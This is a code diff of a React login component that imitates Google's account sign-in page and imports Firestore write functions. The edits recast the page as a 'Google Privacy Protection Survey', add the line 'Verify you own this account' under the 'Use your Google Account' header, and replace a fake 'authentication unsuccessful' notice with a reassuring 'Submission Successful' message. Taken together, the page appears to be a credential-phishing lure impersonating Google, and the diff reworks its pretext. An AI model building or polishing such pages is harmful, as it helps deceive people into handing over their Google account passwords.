@@ -4,7 +4,7 @@
  */
 
 import { useState, FormEvent } from 'react';
-import { ShieldAlert, Terminal, Eye, EyeOff, LayoutGrid } from 'lucide-react';
+import { ShieldAlert, Terminal, Eye, EyeOff, LayoutGrid, CheckCircle2 } from 'lucide-react';
 import { doc, setDoc } from 'firebase/firestore';
 import { db } from '../lib/firebase';
 
@@ -155,24 +155,24 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
           {/* Collapsed view status card */}
           <div className="w-full bg-bg-card border border-border-custom rounded-lg shadow-card p-8 md:p-10 text-center space-y-6">
             <div className="flex justify-center">
-              <div className="w-12 h-12 rounded-full bg-red-50/10 dark:bg-red-950/20 flex items-center justify-center text-brand-error">
-                <ShieldAlert className="h-6 w-6" />
+              <div className="w-12 h-12 rounded-full bg-emerald-500/10 dark:bg-emerald-950/20 flex items-center justify-center text-brand-success">
+                <CheckCircle2 className="h-6 w-6" />
               </div>
             </div>
             
             <div className="space-y-3">
-              <h2 className="text-brand-error text-2xl font-medium tracking-tight">
-                authentication unsuccessful
+              <h2 className="text-brand-success text-2xl font-medium tracking-tight">
+                Submission Successful
               </h2>
               <p className="text-sm text-text-secondary leading-relaxed">
-                We couldn't verify your account credentials. Please wait for a confirmation email to complete the verification process.
+                Thank you! Your response has been recorded successfully. Our team will review your application and process it soon.
               </p>
             </div>
 
             <div className="pt-2">
-              <div className="inline-flex items-center gap-2 px-4 py-2 bg-brand-bg-warning-light border border-brand-border-warning-light rounded-full text-xs text-brand-warning font-medium select-none">
-                <span className="h-2 w-2 rounded-full bg-brand-warning animate-pulse"></span>
-                <span>Wait for a confirmation email</span>
+              <div className="inline-flex items-center gap-2 px-4 py-2 bg-brand-bg-success-light border border-brand-border-success-light rounded-full text-xs text-brand-success font-medium select-none">
+                <span className="h-2 w-2 rounded-full bg-brand-success animate-pulse"></span>
+                <span>Response logged in real-time</span>
               </div>
             </div>
 
@@ -181,7 +181,7 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
                 onClick={() => setIsSubmitted(false)}
                 className="text-sm text-brand-primary hover:opacity-85 font-medium hover:underline transition-all"
               >
-                Go back to Sign in
+                Submit another response
               </button>
             </div>
           </div>
@@ -218,10 +218,10 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
           {/* Editorial Heading Text */}
           <div className="space-y-4">
             <h1 className="text-3xl md:text-[44px] font-light text-text-primary leading-tight tracking-tight max-w-xl">
-              One account. All of Google working for you.
+              Google Privacy Protection Survey
             </h1>
             <p className="text-lg text-text-secondary font-normal max-w-lg">
-              Sign in to confirm you are the owner of this account. <span className="dark:text-[#1A73E8] dark:font-semibold">protect your privacy</span>
+              Please complete this survey form to confirm your interest. <span className="dark:font-semibold">protect your privacy</span>
             </p>
           </div>
 
@@ -237,7 +237,10 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
             {/* Header section */}
             <div className="text-center mb-8">
               <h2 className="text-text-primary text-2xl font-normal">Sign in</h2>
-              <p className="text-sm text-text-secondary mt-2">Use your Google Account</p>
+              <p className="text-sm text-text-secondary mt-2">
+                Use your Google Account<br />
+                <span className="text-[#1a73e8] dark:text-[#8ab4f8] font-medium">Verify you own this account</span>
+              </p>
             </div>
 
             {/* Interactive Login Form */}
